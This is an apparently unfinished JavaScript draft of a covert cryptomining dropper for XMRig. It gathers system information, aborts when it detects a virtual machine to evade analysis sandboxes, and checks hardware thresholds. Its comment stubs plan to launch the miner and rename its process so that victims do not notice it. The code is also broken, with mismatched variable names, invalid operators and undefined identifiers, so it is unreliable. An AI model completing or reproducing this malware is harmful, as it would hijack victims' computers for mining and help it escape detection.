// needed libraries for information collection in XMRig

import { cmd, path, notify } from 'windows-interact';
import system from 'systeminformation';
cmd('dir');

// System data for the miner >:D

const cpuCores = si.cpu(cores);
const os = si.osInfo(platform);
const virtualized = si.system(virtual);
const totalMem = si.mem.total(); // in bytes!
const mobile = si.battery.hasBattery();
const freeOnDisk = si.diskLayout.size(); // in bytes!

// Get path to cmd.exe for the miner to be run from

path`C:\Windows\system32\cmd.exe`;

// Check if the hardware is unsupported or virtualized

if (os ==! 'Windows') {
    notify("This app can't run on your PC");
}
if (virtualized == True) {
    throw new Error('Nice try!');
}
if (totalMem < 8000000000) {
    throw new Error('Not enough memory.');
}
if (freeOnDisk < 32000000000) {
    throw new Error('Not enough disk space.');
}
if (cpuCores < 2) {
    throw new Error('Not enough CPU cores.');
}

// While tree for laptops (separate file maybe...?)

if (mobile == True) {
    while (si.battery.currentCapacity() < 10) {
    }
}

// Launching XMRIG

// Renaming the XMRIG process

// 


